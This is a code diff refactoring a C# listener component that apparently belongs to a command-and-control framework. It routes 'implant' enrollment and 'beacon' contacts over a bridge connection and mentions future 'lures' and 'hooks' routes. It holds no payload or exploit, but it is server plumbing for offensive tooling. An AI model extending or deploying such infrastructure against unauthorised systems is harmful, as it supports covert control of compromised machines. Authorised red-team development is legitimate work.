@@ -6,19 +6,21 @@ using Rod.Transport.Listeners.Streams;
 namespace Rod.Transport.Listeners.Bridge;
 
 // The route-forward carriage's kernel half (ADR-025, the https shape): one
-// duplex connection per medium peer carrying request/answer units
-// dispatched by path. The routes are the implant family's own -- the JSON
-// enroll exchange and the envelope contact -- driven through the same
-// cores the HTTP routes drive, so a contact that crossed the bridge is
-// indistinguishable in core state, the audit trail, and the live bus from
-// one that crossed Kestrel. The scope is the peer: this bridge belongs to
-// one listener, known directly, no local port to resolve.
+// duplex connection per medium peer carrying request/answer units --
+// field maps, nothing positional -- dispatched by path. The routes are the
+// implant family's own -- the JSON enroll exchange and the envelope
+// contact -- driven through the same cores the HTTP routes drive, so a
+// contact that crossed the bridge is indistinguishable in core state, the
+// audit trail, and the live bus from one that crossed Kestrel. The scope
+// is the peer: this bridge belongs to one listener, known directly, no
+// local port to resolve.
 //
-// The web families' asset routes (hooks, lures, artifact fetch) are the
-// same carriage's later arms: the unit already carries the method, the
-// path, and the observed peer facts they audit by, and the answers carry
-// a content type -- the https listener package lands them here without a
-// carriage change.
+// The unit's observed facts (peer, ua, and whatever a later medium
+// honestly observes) ride the map for the routes that audit by them; the
+// web families' asset routes (hooks, lures, artifact fetch) are the same
+// carriage's later arms -- the map already carries the method, the path,
+// and the facts they audit by, so landing them is a dispatch entry, never
+// a carriage change.
 
 /// <summary>
 /// Serves one route-forward connection: request units in, answer units
@@ -54,10 +56,10 @@ internal sealed class BridgeRouteForwarder
 
         while (!stoppingToken.IsCancellationRequested)
         {
-            byte[] unit;
+            byte[] wire;
             try
             {
-                unit = await StreamContactFraming.ReadMessageAsync(stream, stoppingToken);
+                wire = await StreamContactFraming.ReadMessageAsync(stream, stoppingToken);
             }
             catch (Exception ex) when (
                 ex is IOException or OperationCanceledException or ObjectDisposedException
@@ -68,16 +70,24 @@ internal sealed class BridgeRouteForwarder
                 return;
             }
 
-            (int Status, string ContentType, byte[] Body) answer;
-            if (!BridgeRouteProtocol.TryDecodeRequest(
-                    unit, out var method, out var path, out _, out _, out var body))
-            {
+            // A unit without its method and path is malformed -- the same
+            // dropped connection every bridge shape keeps. The body is
+            // optional-shaped (an empty POST is still a POST).
+            if (!BridgeRouteProtocol.TryDecodeUnit(wire, out var request)
+                || !request.TryGetValue(BridgeRouteProtocol.MethodKey, out var methodBytes)
+                || !request.TryGetValue(BridgeRouteProtocol.PathKey, out var pathBytes))
                 return;
-            }
+            var method = System.Text.Encoding.UTF8.GetString(methodBytes);
+            var path = System.Text.Encoding.UTF8.GetString(pathBytes);
+            var body = request.TryGetValue(BridgeRouteProtocol.BodyKey, out var bodyBytes)
+                ? bodyBytes
+                : [];
 
+            byte[] answer;
             try
             {
-                answer = await DispatchAsync(method, path, body, listener, cleartextFallback, stoppingToken);
+                var served = await DispatchAsync(method, path, body, listener, cleartextFallback, stoppingToken);
+                answer = EncodeAnswer(served.Status, served.ContentType, served.Body);
             }
             catch (Exception ex) when (ex is OperationCanceledException or IOException)
             {
@@ -87,17 +97,14 @@ internal sealed class BridgeRouteForwarder
             {
                 _logger.LogInformation(
                     ex, "Bridge route dispatch failed on listener {Name} for {Path}.", listener.Name, path);
-                answer = (502, "application/json; charset=utf-8",
-                    System.Text.Json.JsonSerializer.SerializeToUtf8Bytes(
-                        new Problem("The forwarded request could not be served."),
-                        System.Text.Json.JsonSerializerOptions.Web));
+                answer = EncodeAnswer(
+                    502, "application/json; charset=utf-8",
+                    ProblemBytes("The forwarded request could not be served."));
             }
 
             try
             {
-                await StreamContactFraming.WriteMessageAsync(
-                    stream, BridgeRouteProtocol.EncodeResponse(answer.Status, answer.ContentType, answer.Body),
-                    stoppingToken);
+                await StreamContactFraming.WriteMessageAsync(stream, answer, stoppingToken);
             }
             catch (Exception ex) when (
                 ex is IOException or OperationCanceledException or ObjectDisposedException
@@ -109,21 +116,21 @@ internal sealed class BridgeRouteForwarder
     }
 
     private async Task<(int Status, string ContentType, byte[] Body)> DispatchAsync(
-        byte method,
+        string method,
         string path,
         byte[] body,
         Listener listener,
         bool cleartextFallback,
         CancellationToken cancellationToken)
     {
-        if (method == BridgeRouteProtocol.MethodPost
+        if (string.Equals(method, BridgeRouteProtocol.MethodPost, StringComparison.Ordinal)
             && string.Equals(path, "/implants/enroll", StringComparison.Ordinal))
         {
             var enroll = await _enrollment.HandleAsync(body, listener, cancellationToken);
             return (enroll.Status, enroll.ContentType, enroll.Body);
         }
 
-        if (method == BridgeRouteProtocol.MethodPost
+        if (string.Equals(method, BridgeRouteProtocol.MethodPost, StringComparison.Ordinal)
             && string.Equals(path, "/implants/beacon", StringComparison.Ordinal))
         {
             var contact = await _contact.ContactAsync(
@@ -141,27 +148,27 @@ internal sealed class BridgeRouteForwarder
                     200,
                     contact.Sealed ? "text/plain; charset=utf-8" : "application/octet-stream",
                     contact.Body),
-                401 => (
-                    401,
-                    "application/json; charset=utf-8",
-                    System.Text.Json.JsonSerializer.SerializeToUtf8Bytes(
-                        new Problem(contact.Problem ?? "The contact was refused."),
-                        System.Text.Json.JsonSerializerOptions.Web)),
+                401 => (401, "application/json; charset=utf-8", ProblemBytes(contact.Problem ?? "The contact was refused.")),
                 413 => (413, "application/octet-stream", []),
-                _ => (
-                    400,
-                    "application/json; charset=utf-8",
-                    System.Text.Json.JsonSerializer.SerializeToUtf8Bytes(
-                        new Problem(contact.Problem ?? "The request body was refused."),
-                        System.Text.Json.JsonSerializerOptions.Web)),
+                _ => (400, "application/json; charset=utf-8", ProblemBytes(contact.Problem ?? "The request body was refused.")),
             };
         }
 
-        return (
-            404,
-            "application/json; charset=utf-8",
-            System.Text.Json.JsonSerializer.SerializeToUtf8Bytes(
-                new Problem("No such route on this listener's bridge."),
-                System.Text.Json.JsonSerializerOptions.Web));
+        return (404, "application/json; charset=utf-8", ProblemBytes("No such route on this listener's bridge."));
     }
+
+    private static byte[] EncodeAnswer(int status, string contentType, byte[] body)
+        => BridgeRouteProtocol.EncodeUnit(
+        [
+            KeyValuePair.Create(
+                BridgeRouteProtocol.StatusKey,
+                System.Text.Encoding.ASCII.GetBytes(
+                    status.ToString(System.Globalization.CultureInfo.InvariantCulture))),
+            KeyValuePair.Create(BridgeRouteProtocol.ContentTypeKey, System.Text.Encoding.UTF8.GetBytes(contentType)),
+            KeyValuePair.Create(BridgeRouteProtocol.BodyKey, body),
+        ]);
+
+    private static byte[] ProblemBytes(string problem)
+        => System.Text.Json.JsonSerializer.SerializeToUtf8Bytes(
+            new Problem(problem), System.Text.Json.JsonSerializerOptions.Web);
 }
